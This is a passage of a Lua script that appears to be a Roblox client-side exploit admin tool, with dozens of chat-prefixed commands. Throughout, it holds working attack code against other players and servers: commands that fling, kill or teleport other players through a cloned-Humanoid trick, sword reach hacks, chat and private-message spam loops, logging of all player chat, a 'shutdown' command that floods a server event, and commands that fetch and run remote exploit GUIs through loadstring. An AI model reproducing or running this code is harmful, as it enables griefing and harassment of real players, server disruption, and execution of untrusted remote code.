                    r[i].Locked = true
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."btools") then
        local Clone_T = Instance.new("HopperBin",lplayer.Backpack)
        Clone_T.BinType = "Clone"
        local Destruct = Instance.new("HopperBin",lplayer.Backpack)
        Destruct.BinType = "Hammer"
        local Hold_T = Instance.new("HopperBin",lplayer.Backpack)
        Hold_T.BinType = "Grab"
    end
    if string.sub(msg, 1, 7) == (prefix.."pstand") then
        lplayer.Character.Humanoid.PlatformStand = true
    end
    if string.sub(msg, 1, 9) == (prefix.."unpstand") then
        lplayer.Character.Humanoid.PlatformStand = false
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhead") then
        lplayer.Character.Head.Mesh:Destroy()
    end
    if string.sub(msg, 1, 4) == (prefix.."sit") then
        lplayer.Character.Humanoid.Sit = true
    end
    if string.sub(msg, 1, 10) == (prefix.."bringobj ") then
        local function bringobjw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        obj.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        obj.CanCollide = false
        obj.Transparency = 0.7
        wait()
        obj.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        obj.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        while wait() do
            bringobjw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringObj";
        Text = "BringObj enabled.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."wsvis ") then
        vis = (string.sub(msg, 8))
        local a = game:GetService("Workspace"):GetDescendants()
        for i = 1, #a do
            if a[i].className == "Part" then
                a[i].Transparency = vis
            elseif a[i].className == "Model" then
                local r = a[i]:getChildren()
                for i = 1, #r do
                    if r[i].className == "Part" then
                    r[i].Transparency = vis
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."hypertotal") then
        loadstring(game:GetObjects("rbxassetid://1255063809")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "HyperTotal GUI Loaded!";
        })
    end
    if string.sub(msg, 1, 5) == (prefix.."cmds") then
        CMDSFRAME.Visible = true
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blockhats") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Accessory")) or (v:IsA("Hat")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."rmeshtool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."blocktool") then
        for i,v in pairs(lplayer.Character:GetChildren()) do
            if (v:IsA("Tool")) then
                v.Handle.Mesh:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."spinner") then
        local p = Instance.new("RocketPropulsion")
        p.Parent = lplayer.Character.HumanoidRootPart
        p.Name = "Spinner"
        p.Target = lplayer.Character["Left Arm"]
        p:Fire()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Spinner enabled";
        Text = "Type ;nospinner to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."nospinner") then
        lplayer.Character.HumanoidRootPart.Spinner:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."reachd") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                local a = Instance.new("SelectionBox",v.Handle)
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,60)
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."reach ") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                handleSize = v.Handle.Size
                wait()
                local a = Instance.new("SelectionBox",v.Handle)
                a.Name = "a"
                a.Adornee = v.Handle
                v.Handle.Size = Vector3.new(0.5,0.5,(string.sub(msg, 8)))
                v.GripPos = Vector3.new(0,0,0)
                lplayer.Character.Humanoid:UnequipTools()
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach applied!";
        Text = "Applied to equipped sword. Use ;noreach to disable.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."noreach") then
        for i,v in pairs(game:GetService'Players'.LocalPlayer.Character:GetChildren())do
            if v:isA("Tool") then
                v.Handle.a:Destroy()
                v.Handle.Size = handleSize
            end
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Reach removed!";
        Text = "Removed reach from equipped sword.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."rkill ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8)))do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."tp me ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."cbring ") then
        if (string.sub(msg, 9)) == "all" or (string.sub(msg, 9)) == "All" or (string.sub(msg, 9)) == "ALL" then
            cbringall = true
        else
            for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
                brplr = v.Name
            end
        end
        cbring = true
    end
    if string.sub(msg, 1, 9) == (prefix.."uncbring") then
        cbring = false
        cbringall = false
    end
    if string.sub(msg, 1, 6) == (prefix.."swap ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local NOWPLR = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            local NOW = lplayer.Character.HumanoidRootPart.CFrame
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            local function tp(player,player2)
            local char1,char2=player.Character,player2.Character
            if char1 and char2 then
            char1:MoveTo(char2.Head.Position)
            end
            end
            wait(0.1)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.2)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
            wait(0.5)
            lplayer.Character.HumanoidRootPart.CFrame = NOW
            wait(0.6)
            tp(lplayer, game:GetService("Players")[v.Name])
            wait(0.4)
            lplayer.Character.HumanoidRootPart.CFrame = NOWPLR
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."glitch ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            lplayer.Character.Humanoid.Name = 1
            local l = lplayer.Character["1"]:Clone()
            l.Parent = lplayer.Character
            l.Name = "Humanoid"
            wait(0.1)
            lplayer.Character["1"]:Destroy()
            game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
            lplayer.Character.Animate.Disabled = true
            wait(0.1)
            lplayer.Character.Animate.Disabled = false
            lplayer.Character.Humanoid.DisplayDistanceType = "None"
            for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
            lplayer.Character.Humanoid:EquipTool(v)
            end
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.3)
            lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character["Left Arm"].CFrame
            wait(0.4)
            b = Instance.new("BodyForce")
            b.Parent = lplayer.Character.HumanoidRootPart
            b.Name = "Glitch"
            b.Force = Vector3.new(100000000,5000,0)
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Tools needed!";
            Text = "You need a tool in your backpack for this command!";
            })
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."unglitch") then
        lplayer.Character.HumanoidRootPart.Glitch:Destroy()
        lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(10000,0,10000)
        b = Instance.new("BodyForce")
        b.Parent = lplayer.Character.HumanoidRootPart
        b.Name = "unGlitch"
        b.Force = Vector3.new(0,-5000000,0)
        wait(2)
        lplayer.Character.HumanoidRootPart.unGlitch:Destroy()
    end
    if string.sub(msg, 1, 9) == (prefix.."grespawn") then
        lplayer.Character.Humanoid.Health = 0
        wait(1)
        lplayer.Character.Head.CFrame = CFrame.new(1000000,0,1000000)
        lplayer.Character.Torso.CFrame = CFrame.new(1000000,0,1000000)
    end
    if string.sub(msg, 1, 9) == (prefix.."explorer") then
        loadstring(game:GetObjects("rbxassetid://492005721")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "DEX Explorer has loaded.";
        })
    end
    if string.sub(msg, 1, 6) == (prefix.."anim ") then
        local Anim = Instance.new("Animation")
        Anim.AnimationId = "rbxassetid://"..(string.sub(msg, 7))
        local track = lplayer.Character.Humanoid:LoadAnimation(Anim)
        track:Play(.1, 1, 1)
    end
    if string.sub(msg, 1, 8) == (prefix.."animgui") then
        loadstring(game:GetObjects("rbxassetid://1202558084")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "Energize Animations GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."savepos") then
        saved = lplayer.Character.HumanoidRootPart.CFrame
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Position Saved";
        Text = "Use ;loadpos to return to saved position.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."loadpos") then
        lplayer.Character.HumanoidRootPart.CFrame = saved
    end
    if string.sub(msg, 1, 6) == (prefix.."bang ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 7))) do
            local Anim2 = Instance.new("Animation")
            Anim2.AnimationId = "rbxassetid://148840371"
            local track2 = lplayer.Character.Humanoid:LoadAnimation(Anim2)
            track2:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."unbang") then
        banpl = false
    end
    if string.sub(msg, 1, 10) == (prefix.."bringmod ") then
        local function bringmodw()
        for i,obj in ipairs(game:GetService("Workspace"):GetDescendants()) do
        if obj.Name == (string.sub(msg, 11)) then
        for i,ch in pairs(obj:GetDescendants()) do
        if (ch:IsA("BasePart")) then
        ch.CFrame = lplayer.Character.HumanoidRootPart.CFrame
        ch.CanCollide = false
        ch.Transparency = 0.7
        wait()
        ch.CFrame = lplayer.Character["Left Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Right Leg"].CFrame
        wait()
        ch.CFrame = lplayer.Character["Head"].CFrame
        end
        end
        end
        end
        end
        while wait() do
            bringmodw()
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "BringMod";
        Text = "BringMod enabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."respawn") then
        local mod = Instance.new('Model', workspace) mod.Name = 're '..lplayer.Name
        local hum = Instance.new('Humanoid', mod)
        local ins = Instance.new('Part', mod) ins.Name = 'Torso' ins.CanCollide = false ins.Transparency = 1
        lplayer.Character = mod
    end
    if string.sub(msg, 1, 9) == (prefix.."shutdown") then
        game:GetService'RunService'.Stepped:Connect(function()
        pcall(function()
            for i,v in pairs(game:GetService'Players':GetPlayers()) do
                if v.Character ~= nil and v.Character:FindFirstChild'Head' then
                    for _,x in pairs(v.Character.Head:GetChildren()) do
                        if x:IsA'Sound' then x.Playing = true x.CharacterSoundEvent:FireServer(true, true) end
                    end
                end
            end
        end)
        end)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Attempting Shutdown";
        Text = "Shutdown Attempt has begun.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."delobj ") then
        objtodel = (string.sub(msg, 9))
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v.Name == objtodel then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."getplrs") then
        for i,v in pairs(game:GetService("Players"):GetPlayers())do
            print(v)
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printed";
        Text = "Players have been printed to console. (F9)";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."deldecal") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants())do
            if (v:IsA("Decal")) then
                v:Destroy()
            end
        end
    end
    if string.sub(msg, 1, 11) == (prefix.."opfinality") then
        loadstring(game:GetObjects("rbxassetid://1294358929")[1].Source)()
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Success!";
        Text = "OpFinality GUI has loaded.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."remotes") then
        remotes = true
        added = true
        game.DescendantAdded:connect(function(rmt)
        if added == true then
        if remotes == true then
        if rmt:IsA("RemoteEvent") then
        print("A RemoteEvent was added!")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent")
        print(" game." .. rmt:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end end
        end)
        game.DescendantAdded:connect(function(rmtfnctn)
        if added == true then
        if remotes == true then
        if rmtfnctn:IsA("RemoteFunction") then
        warn("A RemoteFunction was added!")
        warn(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction")
        print(" game." .. rmtfnctn:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bndfnctn)
        if added == true then
        if binds == true then
        if bndfnctn:IsA("BindableFunction") then
        print("A BindableFunction was added!")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction")
        print(" game." .. bndfnctn:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end end
        end)
       
        game.DescendantAdded:connect(function(bnd)
        if added == true then
        if binds == true then
        if bnd:IsA("BindableEvent") then
        warn("A BindableEvent was added!")
        warn(" game." .. bnd:GetFullName() .. " | BindableEvent")
        print(" game." .. bnd:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end end
        end)
       
       
        if binds == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableFunction") then
        print(" game." .. v:GetFullName() .. " | BindableFunction")
        print(" game." .. v:GetFullName() .. " | BindableFunction", 239, 247, 4, true)
        end end
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("BindableEvent") then
        warn(" game." .. v:GetFullName() .. " | BindableEvent")
        print(" game." .. v:GetFullName() .. " | BindableEvent", 13, 193, 22, true)
        end end
        else
        print("Off")
        end
        if remotes == true then
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteFunction") then
        warn(" game." .. v:GetFullName() .. " | RemoteFunction")
        print(" game." .. v:GetFullName() .. " | RemoteFunction", 5, 102, 198, true)
        end end
        wait()
        for i,v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") then
        print(" game." .. v:GetFullName() .. " | RemoteEvent")
        print(" game." .. v:GetFullName() .. " | RemoteEvent", 247, 0, 0, true)
        end end
        else
        print("Off")
        end
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes";
        Text = "Type ;noremotes to disable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noremotes") then
        remotes = false
        added = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Printing Remotes Disabled";
        Text = "Type ;remotes to enable.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."tpdefault") then
        spin = false
        followed = false
        traill = false
        noclip = false
        annoying = false
        hwalk = false
        cbringing = false
    end
    if string.sub(msg, 1, 8) == (prefix.."stopsit") then
        stopsitting = true
    end
    if string.sub(msg, 1, 6) == (prefix.."gosit") then
        stopsitting = false
    end
    if string.sub(msg, 1, 8) == (prefix.."version") then
        print(adminversion)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Version";
        Text = adminversion;
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."clicktp") then
        clickgoto = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Press E to teleport to mouse position, ;noclicktp to stop";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."clickdel") then
        clickdel = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Press E to delete part at mouse, ;noclickdel to stop";
        })
    end
    if string.sub(msg, 1, 11) == (prefix.."noclickdel") then
        clickdel = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click Delete";
        Text = "Click delete has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."noclicktp") then
        clickgoto = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Click TP";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 8) == (prefix.."toolson") then
        gettingtools = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Enabled";
        Text = "Automatically colleting tools dropped.";
        })
    end
    if string.sub(msg, 1, 9) == (prefix.."toolsoff") then
        gettingtools = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Tools Disabled";
        Text = "Click TP has been disabled.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."delcmdbar") then
        ScreenGui:Destroy()
    end
    if string.sub(msg, 1, 6) == (prefix.."reset") then
        lplayer.Character.Head:Destroy()
    end
    if string.sub(msg, 1, 7) == (prefix.."state ") then
        statechosen = string.sub(msg, 8)
        changingstate = true
    end
    if string.sub(msg, 1, 9) == (prefix.."gravity ") then
        game:GetService("Workspace").Gravity = string.sub(msg, 10)
    end
    if string.sub(msg, 1, 10) == (prefix.."looprhats") then
        removingmeshhats = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprhats") then
        removingmeshhats = false
    end
    if string.sub(msg, 1, 10) == (prefix.."looprtool") then
        removingmeshtool = true
    end
    if string.sub(msg, 1, 12) == (prefix.."unlooprtool") then
        removingmeshtool = false
    end
    if string.sub(msg, 1, 10) == (prefix.."givetool ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Character:GetDescendants()) do
            if v:IsA("Tool") then
                for i,player in pairs(GetPlayer(string.sub(msg, 11))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 14) == (prefix.."givealltools ") then
        for i,v in pairs(game:GetService("Players").LocalPlayer.Backpack:GetDescendants()) do
            if v:IsA("Tool") then
                v.Parent = lplayer.Character
                wait()
                for i,player in pairs(GetPlayer(string.sub(msg, 15))) do
                    v.Parent = player.Character
                end
            end
        end
    end
    if string.sub(msg, 1, 5) == (prefix.."age ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account Age: "..player.AccountAge.." days!", "All")
        end
    end
    if string.sub(msg, 1, 4) == (prefix.."id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 5))) do
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(player.Name.." Account ID: "..player.UserId, "All")
        end
    end
    if string.sub(msg, 1, 6) == (prefix..".age ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 7))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.AccountAge.." Days";
            Text = "Account age of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 5) == (prefix..".id ") then
        for i,player in pairs(GetPlayer(string.sub(msg, 6))) do
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = player.UserId.." ID";
            Text = "Account ID of "..player.Name;
            })
        end
    end
    if string.sub(msg, 1, 7) == (prefix.."gameid") then
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Game ID";
        Text = "Game ID: ".. game.GameId;
        })
    end
    if string.sub(msg, 1, 4) == (prefix.."pgs") then
        local pgscheck = game:GetService("Workspace"):PGSIsEnabled()
        if pgscheck == true then
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Enabled!";
            })
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "PGSPhysicsSolverEnabled";
            Text = "PGS is Disabled!";
            })
        end
    end
    if string.sub(msg, 1, 12) == (prefix.."removeinvis") then
        for i,v in pairs(game:GetService("Workspace"):GetDescendants()) do
            if v:IsA("Part") then
                if v.Transparency == 1 then
                    if v.Name ~= "HumanoidRootPart" then
                        v:Destroy()
                    end
                end
            end
        end
    end
    if string.sub(msg, 1, 10) == (prefix.."removefog") then
        game:GetService("Lighting").FogStart = 0
        game:GetService("Lighting").FogEnd = 9999999999999
    end
    if string.sub(msg, 1, 8) == (prefix.."disable") then
        lplayer.Character.Humanoid.Parent = lplayer
    end
    if string.sub(msg, 1, 7) == (prefix.."enable") then
        lplayer.Humanoid.Parent = lplayer.Character
    end
    if string.sub(msg, 1, 8) == (prefix.."prefix ") then
        prefix = (string.sub(msg, 9, 9))
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Use ;resetprefix to reset to ;";
        })
    end
    if string.sub(msg, 1, 12) == (";resetprefix") then
        prefix = ";"
        wait(0.1)
        change()
        wait(0.1)
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "Prefix changed!";
        Text = "Prefix is now "..prefix..". Make sure it's one key!";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."flyspeed ") then
        speedfly = string.sub(msg, 11)
        wait()
        change()
    end
    if string.sub(msg, 1, 8) == (prefix.."carpet ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 9))) do
            local Anim3 = Instance.new("Animation")
            Anim3.AnimationId = "rbxassetid://282574440"
            local track3 = lplayer.Character.Humanoid:LoadAnimation(Anim3)
            track3:Play(.1, 1, 1)
            bplrr = v.Name
            banpl = true
        end
    end
    if string.sub(msg, 1, 9) == (prefix.."uncarpet") then
        banpl = false
    end
    if string.sub(msg, 1, 7) == (prefix.."stare ") then
        for i,v in pairs(GetPlayer(string.sub(msg, 8))) do
            staring = true
            stareplr = v
        end
    end
    if string.sub(msg, 1, 8) == (prefix.."unstare") then
        staring = false
    end
    if string.sub(msg, 1, 8) == (prefix.."logchat") then
        chatlogs = true
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat enabled";
        Text = "Now logging all player chat.";
        })
    end
    if string.sub(msg, 1, 10) == (prefix.."unlogchat") then
        chatlogs = false
        game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "LogChat disabled";
        Text = "Stopped logging all player chat.";
        })
    end
    if string.sub(msg, 1, 7) == (prefix.."fixcam") then
        game:GetService("Workspace").CurrentCamera:Destroy()
        wait(0.1)
        game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character.Humanoid
        game:GetService("Workspace").CurrentCamera.CameraType = "Custom"
        lplayer.CameraMinZoomDistance = 0.5
        lplayer.CameraMaxZoomDistance = 400
        lplayer.CameraMode = "Classic"
    end
    if string.sub(msg, 1, 8) == (prefix.."unstate") then
        changingstate = false
    end
end)
 
local function tp()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            if player.Name == brplr then
                player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 2
            end
        end
    end
end
local function tpall()
    for i, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            player.Character.HumanoidRootPart.CFrame = lplayer.Character.HumanoidRootPart.CFrame + lplayer.Character.HumanoidRootPart.CFrame.lookVector * 3
        end
    end
end
spawn(function()
    while wait(spamdelay) do
        if spamming == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(spamtext, "All")
        end
    end
end)
spawn(function()
    while wait(spamdelay) do
        if spammingpm == true then
            game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w "..pmspammed.." @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@", "All")
        end
    end
end)
spawn(function()
    while wait() do
        if cbring == true then
            tp()
        end
    end
end)
spawn(function()
    while wait() do
        if cbringall == true then
            tpall()
        end
    end
end)
 
Mouse.KeyDown:connect(function(Key)
    if Key == prefix then
        CMDBAR:CaptureFocus()
    end
end)
 
CMDBAR.FocusLost:connect(function(enterPressed)
    if enterPressed then
        if string.sub(CMDBAR.Text, 1, 5) == ("kill ") then
            if string.sub(CMDBAR.Text, 6) == "me" then
                lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(100000,0,100000)
            else
                for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 6)))do
                    local NOW = lplayer.Character.HumanoidRootPart.CFrame
                    lplayer.Character.Humanoid.Name = 1
                    local l = lplayer.Character["1"]:Clone()
                    l.Parent = lplayer.Character
                    l.Name = "Humanoid"
                    wait(0.1)
                    lplayer.Character["1"]:Destroy()
                    game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                    lplayer.Character.Animate.Disabled = true
                    wait(0.1)
                    lplayer.Character.Animate.Disabled = false
                    lplayer.Character.Humanoid.DisplayDistanceType = "None"
                    for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                    lplayer.Character.Humanoid:EquipTool(v)
                    end
                    local function tp(player,player2)
                    local char1,char2=player.Character,player2.Character
                    if char1 and char2 then
                    char1:MoveTo(char2.Head.Position)
                    end
                    end
                    wait(0.1)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.2)
                    lplayer.Character.HumanoidRootPart.CFrame = game:GetService("Players")[v.Name].Character.HumanoidRootPart.CFrame
                    wait(0.5)
                    lplayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(-100000,10,-100000))
                    wait(0.7)
                    tp(lplayer,game:GetService("Players")[v.Name])
                    wait(0.7)
                    lplayer.Character.HumanoidRootPart.CFrame = NOW
                    game:GetService("StarterGui"):SetCore("SendNotification", {
                    Title = "Tools needed!";
                    Text = "You need a tool in your backpack for this command!";
                    })
                end
            end
        end
        if string.sub(CMDBAR.Text, 1, 6) == ("bring ") then
            for i,v in pairs(GetPlayer(string.sub(CMDBAR.Text, 7)))do
                local NOW = lplayer.Character.HumanoidRootPart.CFrame
                lplayer.Character.Humanoid.Name = 1
                local l = lplayer.Character["1"]:Clone()
                l.Parent = lplayer.Character
                l.Name = "Humanoid"
                wait(0.1)
                lplayer.Character["1"]:Destroy()
                game:GetService("Workspace").CurrentCamera.CameraSubject = lplayer.Character
                lplayer.Character.Animate.Disabled = true
                wait(0.1)
                lplayer.Character.Animate.Disabled = false
                lplayer.Character.Humanoid.DisplayDistanceType = "None"
                for i,v in pairs(game:GetService'Players'.LocalPlayer.Backpack:GetChildren())do
                lplayer.Character.Humanoid:EquipTool(v)
                end
                local function tp(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1.HumanoidRootPart.CFrame = char2.HumanoidRootPart.CFrame
                end
                end
                local function getout(player,player2)
                local char1,char2=player.Character,player2.Character
                if char1 and char2 then
                char1:MoveTo(char2.Head.Position)
                end
                end
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.2)
                tp(game:GetService("Players")[v.Name], lplayer)
                wait(0.5)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
                wait(0.5)
                getout(lplayer, game:GetService("Players")[v.Name])
                wait(0.3)
                lplayer.Character.HumanoidRootPart.CFrame = NOW
